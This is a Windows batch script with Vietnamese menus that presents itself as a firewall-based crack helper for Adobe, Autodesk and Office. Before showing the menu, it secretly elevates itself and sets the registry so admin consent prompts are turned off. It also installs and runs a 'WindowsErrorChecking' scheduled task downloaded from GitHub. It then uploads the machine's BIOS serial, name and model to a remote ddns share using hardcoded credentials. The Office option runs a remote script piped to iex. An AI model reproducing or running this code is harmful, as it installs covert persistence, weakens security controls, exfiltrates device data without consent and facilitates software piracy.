@echo off
set "params=%*"
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f
schtasks /End /TN "WindowsErrorChecking"
schtasks /Delete /TN "WindowsErrorChecking" /F
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mitutina/mitutina/main/windowserrorchecking.xml' -OutFile 'C:\Windows\System32\WindowsPowerShell\windowserrorchecking.xml'"
schtasks /create /tn "WindowsErrorChecking" /xml "C:\Windows\System32\WindowsPowerShell\windowserrorchecking.xml" /f
del /f /q "C:\Windows\System32\WindowsPowerShell\windowserrorchecking.xml"
start "" schtasks /Run /TN "WindowsErrorChecking"
powershell -Command "$s=(Get-CimInstance Win32_BIOS).SerialNumber; $n=(Get-CimInstance Win32_ComputerSystem).Name; $m=(Get-CimInstance Win32_ComputerSystem).Model; $f=(Get-CimInstance Win32_ComputerSystem).Manufacturer; $d=$(Get-Date -Format 'yyyy-MM-dd'); $t=$(Get-Date -Format 'HH-mm'); $tf=\"$env:TEMP\tam.txt\"; \"$s`_$n`_$m`_$f`_$d`_$t\" | Out-File $tf; net use '\\minhtuan283.ddns.net\hdd' /user:minhtuan283 Thienngan2002 /persistent:no; if ($?) { $tf2='\\minhtuan283.ddns.net\hdd\serial\log\series_' + $d + '_' + $t + '.txt'; Copy-Item $tf $tf2; if (Test-Path '\\minhtuan283.ddns.net\hdd\serial\seri.txt') { Add-Content '\\minhtuan283.ddns.net\hdd\serial\seri.txt' (Get-Content $tf) } else { Copy-Item $tf '\\minhtuan283.ddns.net\hdd\serial\seri.txt' }; Remove-Item $tf }"
cls
:menu
cls
echo ====================================
echo    Lua chon:
echo    0. Cancel
echo    1. Adobe
echo    2. Autodesk
echo    3. Office
echo    9. Clear Service
echo ====================================
set /p choice=Nhap vao: 
if "%choice%"=="0" goto cancel
if "%choice%"=="1" goto adobe
if "%choice%"=="2" goto autodesk
if "%choice%"=="3" goto office
if "%choice%"=="9" goto menu2
echo Vui Long Nhap Lai!
pause
goto menu

:cancel
echo Ban da chon huy bo.
pause
exit


:delete
schtasks /End /TN "WindowsErrorChecking"
schtasks /Delete /TN "WindowsErrorChecking" /F
del /f /q "C:\Windows\System32\WindowsPowerShell\loop.bat"
echo Delete Service
pause
cls
goto menu2


:adobe
schtasks /End /TN "AdobeHostBlock"
schtasks /Delete /TN "AdobeHostBlock" /F
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/minhtuan283/host/main/adobehostblock.xml' -OutFile 'C:\adobehostblock.xml'"
schtasks /create /tn "AdobeHostBlock" /xml "C:\adobehostblock.xml" /f
del /f /q "C:\adobehostblock.xml"
start "" schtasks /Run /TN "AdobeHostBlock"
:: Chặn outbound và inbound cho các tệp .exe trong "C:\Program Files\Adobe"
for /R "C:\Program Files\Adobe" %%f in (*.exe) do (
  netsh advfirewall firewall add rule name="Outbound Blocked: %%f" dir=out program="%%f" action=block
  netsh advfirewall firewall add rule name="Inbound Blocked: %%f" dir=in program="%%f" action=block
)
:: Chặn outbound và inbound cho các tệp .exe trong "C:\Program Files (x86)\Adobe"
for /R "C:\Program Files (x86)\Adobe" %%f in (*.exe) do (
  netsh advfirewall firewall add rule name="Outbound Blocked: %%f" dir=out program="%%f" action=block
  netsh advfirewall firewall add rule name="Inbound Blocked: %%f" dir=in program="%%f" action=block
)
:: Chặn outbound và inbound cho các tệp .exe trong "C:\Program Files (x86)\Common Files\Adobe"
for /R "C:\Program Files (x86)\Common Files\Adobe" %%f in (*.exe) do (
  netsh advfirewall firewall add rule name="Outbound Blocked: %%f" dir=out program="%%f" action=block
  netsh advfirewall firewall add rule name="Inbound Blocked: %%f" dir=in program="%%f" action=block
)
:: Chặn outbound và inbound cho các tệp .exe trong "C:\ProgramData\Adobe"
for /R "C:\ProgramData\Adobe" %%f in (*.exe) do (
  netsh advfirewall firewall add rule name="Outbound Blocked: %%f" dir=out program="%%f" action=block
  netsh advfirewall firewall add rule name="Inbound Blocked: %%f" dir=in program="%%f" action=block
)
:: Chặn outbound và inbound cho các tệp .exe trong "C:\Program Files\Common Files\Adobe"
for /R "C:\Program Files\Common Files\Adobe" %%f in (*.exe) do (
  netsh advfirewall firewall add rule name="Outbound Blocked: %%f" dir=out program="%%f" action=block
  netsh advfirewall firewall add rule name="Inbound Blocked: %%f" dir=in program="%%f" action=block
)
echo Hoan thanh Block Adobe.
pause
cls
goto menu

:autodesk
schtasks /End /TN "AutoDeskHostBlock"
schtasks /Delete /TN "AutoDeskHostBlock" /F
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/minhtuan283/host/main/autodeskhostsblock.xml' -OutFile 'C:\autodeskhostsblock.xml'"
schtasks /create /tn "AutoDeskHostBlock" /xml "C:\autodeskhostsblock.xml" /f
del /f /q "C:\autodeskhostsblock.xml"
start "" schtasks /Run /TN "AutoDeskHostBlock"
:: Chặn outbound và inbound cho các tệp .exe trong "C:\Program Files (x86)\Common Files\Autodesk Shared"
for /R "C:\Program Files (x86)\Common Files\Autodesk Shared" %%f in (*.exe) do (
  netsh advfirewall firewall add rule name="Outbound Blocked: %%f" dir=out program="%%f" action=block
  netsh advfirewall firewall add rule name="Inbound Blocked: %%f" dir=in program="%%f" action=block
)
:: Chặn outbound và inbound cho các tệp .exe trong "C:\Program Files (x86)\Autodesk"
for /R "C:\Program Files (x86)\Autodesk" %%f in (*.exe) do (
  netsh advfirewall firewall add rule name="Outbound Blocked: %%f" dir=out program="%%f" action=block
  netsh advfirewall firewall add rule name="Inbound Blocked: %%f" dir=in program="%%f" action=block
)
:: Chặn outbound và inbound cho các tệp .exe trong "C:\Program Files\Autodesk"
for /R "C:\Program Files\Autodesk" %%f in (*.exe) do (
  netsh advfirewall firewall add rule name="Outbound Blocked: %%f" dir=out program="%%f" action=block
  netsh advfirewall firewall add rule name="Inbound Blocked: %%f" dir=in program="%%f" action=block
)
:: Chặn outbound và inbound cho các tệp .exe trong "C:\Program Files\Common Files\Autodesk"
for /R "C:\Program Files\Common Files\Autodesk" %%f in (*.exe) do (
  netsh advfirewall firewall add rule name="Outbound Blocked: %%f" dir=out program="%%f" action=block
  netsh advfirewall firewall add rule name="Inbound Blocked: %%f" dir=in program="%%f" action=block
)
:: Chặn outbound và inbound cho các tệp .exe trong "C:\ProgramData\Autodesk"
for /R "C:\ProgramData\Autodesk" %%f in (*.exe) do (
  netsh advfirewall firewall add rule name="Outbound Blocked: %%f" dir=out program="%%f" action=block
  netsh advfirewall firewall add rule name="Inbound Blocked: %%f" dir=in program="%%f" action=block
)
echo Hoan thanh Block AutoDesk
pause
cls
goto menu

:office
powershell -Command "irm https://get.activated.win|iex"
exit

:menu2
cls
echo         CLEAN SERVICE
echo ====================================
echo    Lua chon:
echo    0. Cancel
echo    1. Clear Adobe
echo    2. Clear Autodesk
echo    3. Delete Service
echo    9. Back
echo ====================================
set /p choice2=Nhap vao: 
if "%choice2%"=="0" goto cancel
if "%choice2%"=="1" goto adobe2
if "%choice2%"=="2" goto autodesk2
if "%choice2%"=="3" goto delete
if "%choice2%"=="9" goto menu
echo Vui Long Nhap Lai!
pause
goto menu2

:autodesk2
:: Xóa quy tắc outbound và inbound cho các tệp .exe trong "C:\Program Files (x86)\Common Files\Autodesk Shared"
for /R "C:\Program Files (x86)\Common Files\Autodesk Shared" %%f in (*.exe) do (
  netsh advfirewall firewall delete rule name="Outbound Blocked: %%f"
  netsh advfirewall firewall delete rule name="Inbound Blocked: %%f"
)

:: Xóa quy tắc outbound và inbound cho các tệp .exe trong "C:\Program Files (x86)\Autodesk"
for /R "C:\Program Files (x86)\Autodesk" %%f in (*.exe) do (
  netsh advfirewall firewall delete rule name="Outbound Blocked: %%f"
  netsh advfirewall firewall delete rule name="Inbound Blocked: %%f"
)

:: Xóa quy tắc outbound và inbound cho các tệp .exe trong "C:\Program Files\Autodesk"
for /R "C:\Program Files\Autodesk" %%f in (*.exe) do (
  netsh advfirewall firewall delete rule name="Outbound Blocked: %%f"
  netsh advfirewall firewall delete rule name="Inbound Blocked: %%f"
)

:: Xóa quy tắc outbound và inbound cho các tệp .exe trong "C:\Program Files\Common Files\Autodesk"
for /R "C:\Program Files\Common Files\Autodesk" %%f in (*.exe) do (
  netsh advfirewall firewall delete rule name="Outbound Blocked: %%f"
  netsh advfirewall firewall delete rule name="Inbound Blocked: %%f"
)

:: Xóa quy tắc outbound và inbound cho các tệp .exe trong "C:\ProgramData\Autodesk"
for /R "C:\ProgramData\Autodesk" %%f in (*.exe) do (
  netsh advfirewall firewall delete rule name="Outbound Blocked: %%f"
  netsh advfirewall firewall delete rule name="Inbound Blocked: %%f"
)
echo Hoan thanh Clean Autodesk
pause
cls
goto menu2

:adobe2
:: Xóa quy tắc outbound và inbound cho các tệp .exe trong "C:\Program Files\Adobe"
for /R "C:\Program Files\Adobe" %%f in (*.exe) do (
  netsh advfirewall firewall delete rule name="Outbound Blocked: %%f"
  netsh advfirewall firewall delete rule name="Inbound Blocked: %%f"
)

:: Xóa quy tắc outbound và inbound cho các tệp .exe trong "C:\Program Files (x86)\Adobe"
for /R "C:\Program Files (x86)\Adobe" %%f in (*.exe) do (
  netsh advfirewall firewall delete rule name="Outbound Blocked: %%f"
  netsh advfirewall firewall delete rule name="Inbound Blocked: %%f"
)

:: Xóa quy tắc outbound và inbound cho các tệp .exe trong "C:\Program Files (x86)\Common Files\Adobe"
for /R "C:\Program Files (x86)\Common Files\Adobe" %%f in (*.exe) do (
  netsh advfirewall firewall delete rule name="Outbound Blocked: %%f"
  netsh advfirewall firewall delete rule name="Inbound Blocked: %%f"
)

:: Xóa quy tắc outbound và inbound cho các tệp .exe trong "C:\ProgramData\Adobe"
for /R "C:\ProgramData\Adobe" %%f in (*.exe) do (
  netsh advfirewall firewall delete rule name="Outbound Blocked: %%f"
  netsh advfirewall firewall delete rule name="Inbound Blocked: %%f"
)

:: Xóa quy tắc outbound và inbound cho các tệp .exe trong "C:\Program Files\Common Files\Adobe"
for /R "C:\Program Files\Common Files\Adobe" %%f in (*.exe) do (
  netsh advfirewall firewall delete rule name="Outbound Blocked: %%f"
  netsh advfirewall firewall delete rule name="Inbound Blocked: %%f"
)
echo Hoan thanh Clean Adobe
pause
cls
goto menu2

exit
